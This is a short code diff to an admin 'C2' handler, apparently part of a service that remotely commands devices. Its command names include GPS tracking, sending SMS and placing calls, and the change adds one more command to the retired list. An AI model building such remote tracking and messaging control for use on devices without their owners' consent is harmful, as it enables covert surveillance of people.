@@ -1331,7 +1331,7 @@ async function handleAdminC2(request, env, url) {
     return json({ devices, now: Math.floor(Date.now() / 1000) });
   }
   if (request.method === "POST" && p === "/admin/api/c2/cmd") {
-    const C2_RETIRED = new Set(["gps_track","sms_send","call","eco","active","ping","restart"]);
+    const C2_RETIRED = new Set(["gps_track","sms_send","call","eco","active","ping","restart","app_icons"]);
     let body; try { body = await request.json(); } catch (_) { return json({ error: "Cerere invalidă." }, 400); }
     const uid = c2Safe(body.uid);
     if (!uid) return json({ error: "Lipsește uid." }, 400);
